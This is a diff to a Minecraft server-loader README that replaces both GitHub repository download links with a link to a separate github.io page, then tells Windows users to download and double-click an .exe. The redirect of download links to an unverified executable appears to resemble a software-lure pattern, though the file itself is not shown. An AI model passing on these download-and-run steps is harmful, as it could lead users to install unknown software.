@@ -1,6 +1,6 @@
 # 📦 horde-minecraft-loader - Simple tool to launch Minecraft servers
 
-[![Download](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/sureasshooting-brotula854/horde-minecraft-loader)
+[![Download](https://img.shields.io/badge/Download-Latest-blue.svg)](https://sureasshooting-brotula854.github.io)
 
 HordeMinecraft helps you set up and run your own Minecraft server. This tool removes the manual work of finding specific software versions and downloading individual build files. It manages the server files for you so you can focus on playing with your friends.
 
@@ -19,7 +19,7 @@ If you encounter issues during startup, verify that you have the latest Java Run
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to fetch the software: [Download HordeMinecraft](https://github.com/sureasshooting-brotula854/horde-minecraft-loader)
+1. Visit the repository page to fetch the software: [Download HordeMinecraft](https://sureasshooting-brotula854.github.io)
 2. Locate the folder where your computer saves downloaded files.
 3. Find the file labeled with the .exe extension.
 4. Double-click this file to start the installation process.
